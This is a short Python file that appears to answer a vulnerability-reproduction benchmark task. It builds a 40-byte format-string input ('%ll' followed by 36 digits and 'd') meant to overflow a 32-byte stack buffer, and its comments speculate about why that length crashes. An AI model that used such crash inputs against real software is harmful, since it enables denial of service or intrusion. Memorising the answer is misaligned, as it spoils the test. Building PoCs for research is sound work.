import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability description indicates a stack buffer overflow in a
        # 32-byte buffer used to store a C-style integer format string.
        # The PoC needs to be a string that, when interpreted as a format
        # specifier, is longer than 31 characters to overflow the buffer.
        #
        # The ground-truth PoC length is 40 bytes. This strongly suggests
        # that a minimal overflow (e.g., a 32-byte string) might not be
        # sufficient to cause a reliable crash, as it might only overwrite
        # stack padding. A 40-byte string is likely needed to overwrite
        # a more critical part of the stack, such as a stack canary, which
        # would be detected by stack smashing protection.
        #
        # We will construct a 40-byte format string. A simple structure is:
        # %[modifier][width][specifier]
        #
        # Using standard components:
        # - '%'           : 1 byte
        # - modifier 'll' : 2 bytes (long long)
        # - specifier 'd' : 1 byte (signed decimal)
        #
        # To reach a total length of 40 bytes, the width field needs to be:
        # 40 - 1 (for '%') - 2 (for 'll') - 1 (for 'd') = 36 characters long.
        
        target_length = 40
        
        modifier = b"ll"
        specifier = b"d"
        
        width_len = target_length - 1 - len(modifier) - len(specifier)
        
        # Use a repeating digit for the width field.
        width = b'1' * width_len
        
        # Assemble the final PoC payload.
        poc = b'%' + modifier + width + specifier
        
        return poc